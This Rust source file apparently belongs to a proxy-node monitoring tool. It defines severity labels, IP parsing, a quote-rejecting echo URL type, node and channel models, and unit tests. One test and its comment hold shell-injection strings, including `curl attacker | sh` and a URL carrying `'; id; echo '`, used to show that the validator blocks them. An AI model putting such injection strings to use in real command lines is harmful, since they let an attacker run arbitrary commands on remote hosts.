use serde::{Deserialize, Serialize};
use std::collections::HashMap;

/// Severity of a single check. Ordering matters: the run's overall severity is the maximum.
///
/// One textual encoding, and only one: the state file goes through `Display`/`FromStr` too, so
/// what is written there is the same `OK`/`WARN`/`FAIL` the report and the alerts show. A derived
/// encoding would give the same value a second spelling that nothing else in the tool understands.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(into = "String", try_from = "String")]
pub enum Severity {
    Ok,
    Warn,
    Fail,
}

impl From<Severity> for String {
    fn from(severity: Severity) -> Self {
        severity.to_string()
    }
}

impl TryFrom<String> for Severity {
    type Error = ParseSeverityError;

    fn try_from(s: String) -> Result<Self, Self::Error> {
        s.parse()
    }
}

impl Severity {
    pub fn is_ok(self) -> bool {
        self == Severity::Ok
    }
}

/// How a severity appears in the report and in every alert. These three strings are part of the
/// tool's output contract, not a debug rendering.
impl std::fmt::Display for Severity {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        // `pad`, not `write_str`: the report table formats severities with a width (`{:<6}`),
        // and only `pad` honours it.
        f.pad(match self {
            Severity::Ok => "OK",
            Severity::Warn => "WARN",
            Severity::Fail => "FAIL",
        })
    }
}

/// Anything that is not one of the three labels.
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
#[error("unknown severity: {0}")]
pub struct ParseSeverityError(pub String);

impl std::str::FromStr for Severity {
    type Err = ParseSeverityError;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s {
            "OK" => Ok(Severity::Ok),
            "WARN" => Ok(Severity::Warn),
            "FAIL" => Ok(Severity::Fail),
            other => Err(ParseSeverityError(other.to_string())),
        }
    }
}

/// The one place that decides what counts as an address.
///
/// Both sides of the exit comparison — what the channel's tunnel came out as, and what the node
/// says its own egress is — go through here, so neither can drift into a different notion of
/// "same address". Anything that is not a bare IP (an HTML error page from a CDN, a curl error
/// line, a captive-portal form) is not an address and must never be reported as one.
pub fn parse_ip(text: &str) -> Option<std::net::IpAddr> {
    text.trim().parse().ok()
}

/// The endpoint that echoes a caller's address back, refused if it could not be quoted safely.
///
/// This value reaches a node inside a shell command line, single-quoted:
/// `curl -fsS --max-time 8 '<url>'`. Inside single quotes a POSIX shell treats every character
/// literally except the quote itself, so a URL carrying one could end the quoting and continue
/// as a command of its own. Refusing that once, here, is what makes it impossible everywhere the
/// value is used: there is no other way to build one, and nothing downstream can receive a URL
/// that was never checked.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct EchoUrl(String);

impl EchoUrl {
    pub fn as_str(&self) -> &str {
        &self.0
    }
}

/// A URL that cannot be put into a command line safely.
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
#[error("an echo URL may not contain a quote: {0}")]
pub struct QuotedEchoUrl(pub String);

impl std::str::FromStr for EchoUrl {
    type Err = QuotedEchoUrl;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        if s.contains('\'') {
            return Err(QuotedEchoUrl(s.to_string()));
        }
        Ok(Self(s.to_string()))
    }
}

impl std::fmt::Display for EchoUrl {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(&self.0)
    }
}

/// One check outcome. `key` is stable across runs and is what the diff compares.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CheckResult {
    pub key: String,
    pub title: String,
    pub severity: Severity,
    pub detail: String,
}

impl CheckResult {
    pub fn new(
        key: impl Into<String>,
        title: impl Into<String>,
        severity: Severity,
        detail: impl Into<String>,
    ) -> Self {
        Self {
            key: key.into(),
            title: title.into(),
            severity,
            detail: detail.into(),
        }
    }
}

/// A node as the panel describes it.
#[derive(Debug, Clone, PartialEq)]
pub struct Node {
    pub name: String,
    /// Address the panel uses to reach the node; also the SSH target.
    pub address: String,
    pub profile_uuid: Option<String>,
    /// Tags of the inbounds currently active on this node.
    pub inbound_tags: Vec<String>,
    /// Ports of those inbounds; drives the "is it listening" check.
    pub inbound_ports: Vec<u16>,
    pub is_disabled: bool,
    pub is_connected: bool,
    /// The panel is mid-(re)connect. Kept apart from `is_connected`, which is false for the whole
    /// of that window: without this bit a node that is merely reconnecting is indistinguishable
    /// from one that is down.
    pub is_connecting: bool,
    pub last_status_message: Option<String>,
    pub xray_version: Option<String>,
}

/// What the panel says about a node, as one value.
///
/// The three flags are mirrored from the panel exactly as they arrived, because the panel's own
/// writes are not transactional with its start job: it finishes that job by storing whether the
/// node started without re-reading whether the node has since been disabled. Any combination of
/// bits is therefore observable, and collapsing them at the boundary would be guessing. The
/// collapse happens here instead, once, with a fixed precedence.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PanelState<'a> {
    /// Switched off by an administrator.
    Disabled,
    /// Connecting, or reconnecting after a drop.
    Connecting,
    /// Down, with whatever reason the panel recorded for the last attempt.
    Disconnected {
        reason: Option<&'a str>,
    },
    Connected,
}

impl Node {
    /// The panel's verdict on this node, decided in one place.
    ///
    /// The order of the arms is the whole content of this function. `Disabled` wins over
    /// everything: an administrator switching a node off is the explanation for whatever else the
    /// node reports, and the panel stops the node's xray on that path anyway. `Connecting` wins
    /// over `Disconnected` because the panel sets it *without* clearing `last_status_message` —
    /// the reason sitting there belongs to an earlier attempt, so reporting a reconnecting node as
    /// down would name a cause that is no longer current.
    pub fn panel_state(&self) -> PanelState<'_> {
        if self.is_disabled {
            PanelState::Disabled
        } else if self.is_connecting {
            PanelState::Connecting
        } else if !self.is_connected {
            PanelState::Disconnected {
                reason: self.last_status_message.as_deref(),
            }
        } else {
            PanelState::Connected
        }
    }

    /// Not switched off by an administrator.
    ///
    /// Deliberately narrower than the panel's own notion of a usable node, which also requires the
    /// node to be connected and not connecting: a node that dropped its connection is exactly the
    /// one whose host this tool still wants to look at over SSH.
    pub fn is_enabled(&self) -> bool {
        !self.is_disabled
    }
}

/// A client-facing channel, exactly as the monitoring user receives it.
#[derive(Debug, Clone, PartialEq)]
pub struct Channel {
    /// Host remark; used as the human-facing channel name and as part of the check key.
    pub remark: String,
    pub inbound_tag: String,
    /// Config profile the panel attached this host to. `None` is a legitimate panel state — a
    /// legacy host, or one whose config profile was deleted — not corrupted data; such a channel
    /// has no entry node to resolve and must fail loudly rather than being treated as healthy.
    pub profile_uuid: Option<String>,
    pub address: String,
    pub port: u16,
    /// Ready-made Xray outbound taken from the subscription. Never assembled by us.
    /// `Value::Null` means the subscription served no config for this channel.
    pub outbound: serde_json::Value,
}

impl Channel {
    /// Stable key of this channel's check, unique by construction. Built by `CheckKey`, which is
    /// where every key of every check comes from and where the reasoning lives.
    pub fn check_key(&self) -> String {
        crate::keys::CheckKey::Channel {
            remark: &self.remark,
            address: &self.address,
            port: self.port,
        }
        .key()
    }
}

/// An Xray config profile: the full JSON, as stored in the panel.
#[derive(Debug, Clone, PartialEq)]
pub struct Profile {
    pub uuid: String,
    pub name: String,
    pub config: serde_json::Value,
}

/// Everything one run needs from the panel.
#[derive(Debug, Clone, PartialEq)]
pub struct Snapshot {
    pub nodes: Vec<Node>,
    pub profiles: HashMap<String, Profile>,
    pub channels: Vec<Channel>,
    /// Remarks the rendered subscription actually served, duplicates included. Kept as a list
    /// rather than a count so `subscription:coverage` can compare sets and name what is missing:
    /// one channel dropped and another one duplicated leaves the counts equal.
    pub served_remarks: Vec<String>,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn severity_orders_ok_below_warn_below_fail() {
        assert!(Severity::Ok < Severity::Warn);
        assert!(Severity::Warn < Severity::Fail);
    }

    #[test]
    fn only_a_bare_address_parses_as_an_ip() {
        assert_eq!(
            parse_ip(" 203.0.113.7\n"),
            Some("203.0.113.7".parse().unwrap())
        );
        assert_eq!(
            parse_ip("2001:db8::1"),
            Some("2001:db8::1".parse().unwrap())
        );
        assert_eq!(parse_ip(""), None);
        assert_eq!(
            parse_ip("<html><title>502 Bad Gateway</title></html>"),
            None
        );
        assert_eq!(parse_ip("203.0.113.7 (cached)"), None);
        assert_eq!(parse_ip("curl: (28) Operation timed out"), None);
    }

    #[test]
    fn severity_renders_the_three_report_labels() {
        assert_eq!(Severity::Ok.to_string(), "OK");
        assert_eq!(Severity::Warn.to_string(), "WARN");
        assert_eq!(Severity::Fail.to_string(), "FAIL");
    }

    #[test]
    fn severity_honours_a_format_width() {
        // The report table lays severities out in a fixed column; losing the padding would
        // silently reflow every row of the report.
        assert_eq!(format!("{:<6}|", Severity::Ok), "OK    |");
        assert_eq!(format!("{:<6}|", Severity::Fail), "FAIL  |");
    }

    #[test]
    fn severity_parses_back_from_its_own_label() {
        for s in [Severity::Ok, Severity::Warn, Severity::Fail] {
            assert_eq!(s.to_string().parse::<Severity>(), Ok(s));
        }
    }

    #[test]
    fn an_unknown_severity_label_is_an_error_naming_the_input() {
        let err = "SOMETHING".parse::<Severity>().unwrap_err();
        assert_eq!(err, ParseSeverityError("SOMETHING".to_string()));
        assert!(err.to_string().contains("SOMETHING"));
        // Case and stray whitespace are not silently accepted: the labels are exact.
        assert!("fail".parse::<Severity>().is_err());
        assert!(" FAIL".parse::<Severity>().is_err());
        assert!("".parse::<Severity>().is_err());
    }

    #[test]
    fn channels_sharing_a_remark_still_get_different_keys() {
        let channel = |address: &str, port: u16| Channel {
            remark: "the same remark".into(),
            inbound_tag: "in-a".into(),
            profile_uuid: Some("p".into()),
            address: address.into(),
            port,
            outbound: serde_json::Value::Null,
        };
        let a = channel("alpha.example.com", 443);
        let b = channel("beta.example.com", 443);
        let c = channel("alpha.example.com", 8443);
        assert_ne!(a.check_key(), b.check_key());
        assert_ne!(a.check_key(), c.check_key());
        assert!(a.check_key().starts_with("channel:"));
        // Stable across calls: the diff between two runs depends on it.
        assert_eq!(a.check_key(), channel("alpha.example.com", 443).check_key());
    }

    #[test]
    fn an_echo_url_carrying_a_quote_is_refused() {
        use std::str::FromStr;

        // The shape that made this a type: `'; curl attacker | sh; echo '` would close the
        // quoting of the command line it is pasted into and run as its own command.
        let hostile = "https://example.com/'; id; echo '";
        assert_eq!(
            EchoUrl::from_str(hostile),
            Err(QuotedEchoUrl(hostile.to_string()))
        );
        assert!(EchoUrl::from_str(hostile)
            .unwrap_err()
            .to_string()
            .contains("quote"));

        let ordinary = "https://api.ipify.org";
        assert_eq!(EchoUrl::from_str(ordinary).unwrap().as_str(), ordinary);
        // Everything else a URL may carry is literal inside single quotes, and stays allowed.
        assert!(EchoUrl::from_str("https://e.example.com/ip?fmt=$x&y=`z`;#|").is_ok());
    }

    #[test]
    fn check_result_carries_key_title_and_detail() {
        let r = CheckResult::new("channel:alpha", "alpha", Severity::Fail, "no exit");
        assert_eq!(r.key, "channel:alpha");
        assert_eq!(r.title, "alpha");
        assert_eq!(r.severity, Severity::Fail);
        assert_eq!(r.detail, "no exit");
    }

    fn node(disabled: bool, connecting: bool, connected: bool, message: Option<&str>) -> Node {
        Node {
            name: "alpha".into(),
            address: "192.0.2.1".into(),
            profile_uuid: None,
            inbound_tags: vec![],
            inbound_ports: vec![],
            is_disabled: disabled,
            is_connected: connected,
            is_connecting: connecting,
            last_status_message: message.map(String::from),
            xray_version: None,
        }
    }

    #[test]
    fn a_disabled_node_stays_disabled_whatever_the_other_bits_say() {
        // The panel's writes are not transactional with its own start job: a node disabled while
        // that job was in flight comes back disabled with `isConnected` still set. The bits are
        // mirrored as they arrived, so the precedence here is what settles such a node.
        assert_eq!(
            node(true, false, true, None).panel_state(),
            PanelState::Disabled
        );
        assert_eq!(
            node(true, true, false, None).panel_state(),
            PanelState::Disabled
        );
    }

    #[test]
    fn a_reconnecting_node_is_neither_connected_nor_a_failure() {
        // The panel sets `isConnecting` without clearing `lastStatusMessage`, so the reason left
        // there belongs to an earlier attempt and this state carries none.
        assert_eq!(
            node(false, true, false, Some("boom")).panel_state(),
            PanelState::Connecting
        );
    }

    #[test]
    fn a_disconnected_node_carries_the_panels_own_reason_only_when_there_is_one() {
        assert_eq!(
            node(false, false, false, Some("boom")).panel_state(),
            PanelState::Disconnected {
                reason: Some("boom")
            }
        );
        assert_eq!(
            node(false, false, false, None).panel_state(),
            PanelState::Disconnected { reason: None }
        );
        // A connected node keeps whatever message the last failure left behind; it is not current.
        assert_eq!(
            node(false, false, true, Some("boom")).panel_state(),
            PanelState::Connected
        );
    }

    #[test]
    fn only_an_administrator_switching_a_node_off_makes_it_not_enabled() {
        // Narrower than the panel's own notion of a usable node on purpose: a node that dropped
        // its connection is exactly the one whose host is still worth looking at over SSH.
        assert!(node(false, false, true, None).is_enabled());
        assert!(node(false, false, false, None).is_enabled());
        assert!(node(false, true, false, None).is_enabled());
        assert!(!node(true, false, false, None).is_enabled());
    }
}
